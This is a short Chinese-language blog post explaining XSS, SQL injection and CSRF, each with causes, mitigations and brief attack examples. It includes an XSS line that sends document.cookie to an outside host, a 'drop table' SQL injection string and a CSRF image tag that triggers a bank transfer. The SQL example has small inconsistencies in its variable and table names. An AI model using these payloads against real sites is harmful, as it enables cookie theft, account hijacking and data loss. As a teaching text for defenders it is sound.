---
layout: post
title:  "Web安全"
date:   2016-03-29 22:06:52
categories: security encypt dencypt
comments: true
thread: 20160329220652555
---

# 概述

  春风吹，战鼓擂，除了互联网还有谁……

现今互联网在各行各业潜移默化的渗透到我们生活的各个领域， 生活水电煤，淘宝京东购物， 吃喝玩乐新美大等等， 在改变着我们生活的同时，各种门，隐私信息、密码、资金被盗现象频繁发生。Web程序安全问题越来越受到关注。

很多Web应用程序的安全问题都是由于轻信了第三方提供的数据。比如用户输入的数据，验证之前都属于不安全的数据，输出到客户端可能造成XSS跨站脚本攻击；不安全数据作用到数据库，可能产生SQL注入问题；更为危险的一种就是CSRF。那我们作为应用开发者应该怎么办呢？

# XSS(Cross Site Script 跨站脚本攻击)

### XSS成因
XSS其实就是Html的注入问题，攻击者的输入没有经过严格的控制进入了数据库，最终显示给来访的用户，导致可以在来访用户的浏览器里以浏览用户的身份执行Html代码，数据流程如下：攻击者的Html输入—>web程序—>进入数据库—>web程序—>用户浏览器。

### 攻击手段和目的:
攻击者使被攻击者在浏览器中执行脚本后，如果需要收集来自被攻击者的数据（如cookie或其他敏感信息），可以自行架设一个网站，让被攻击者通过JavaScript等方式把收集好的数据作为参数提交，随后以数据库等形式记录在攻击者自己的服务器上。

1. 盗用 cookie ，获取敏感信息。
2. 利用植入 Flash ，通过 crossdomain 权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
3. 利用 iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。
4. 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
5. 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。

### 攻击示例
```javascript
<script>alert(document.cookie)</script>
location.href='<a href='http://www.xss.com?cookie='+'document.cookie;
while (true) { alert("你关不掉我~");}
```

### 解决方法
- 过滤特殊字符
  对特殊字符过滤或者escape、

- 使用HTTP头指定类型
  set("Content-Type", "text/javascript"), 知道浏览器解析javascript

# SQL注入（SQL Injection）
简称SQL注入攻击，是一种常见的安全漏洞，用来从数据库获取敏感信息，或者避开数据库限制条件的判断。

### 成因
没有对用户输入做有效过滤

### 攻击手段和目的
- 通过串联硬编码字符串和用户输入的字符串而生成一个 SQL 查询

### 攻击示例
```Html
<form ....>
......
<input name="name"></input>
........
</form>
```
```Java
String name = request.getAttribute("name");
String sql = "select * from Order where name = '" + shipCity + "'";
```
假定用户输入以下内容：Coyote'; drop table Order--
此时，脚本将组成以下查询：SELECT * FROM Coyote WHERE name = 'Coyote'; drop table Order--'
啦么，你完蛋了小狼。

### 解决方式
1. 严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度减少注入攻击对数据库的危害。
2. 检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用regexp包进行一些匹配处理。
3. 对进入数据库的特殊字符（'"\尖括号&* ;等) 进行转义处理，或编码转换。
4. 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句。

# CSRF(Cross Site Request Forgery 跨站请求伪造)

### 成因
伪造请求，冒充用户在站内的正常操作。
![Web CSRF](/assets/img/security/web_csrf.jpg)

### 攻击手段
绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。

### 攻击示例

- 银行网站A，它以GET请求来完成银行转账的操作，如http://www.mybank.com/Transfer.php?toBankId=11&money=1000
- 危险网站B，它里面有一段HTML的代码如下<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
- 首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块......

> 为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“http://www.mybank.com/Transfer.php?toBankId=11&money=1000”， 结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作......\

### 解决方式
一般都是在服务器端做处理：
- 正确使用Get、Post方式
- 非Get请求中增加伪随机数， 使用一次后即丢弃。
- Cookie信息加密


## 参考:
- [浅谈CSRF攻击方式](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
- [XSS与CSRF的区别](http://selfcontroller.iteye.com/blog/1844653)
- [AES,SHA1,DES,RSA,MD5区别](http://blog.csdn.net/hengshujiyi/article/details/45972533)
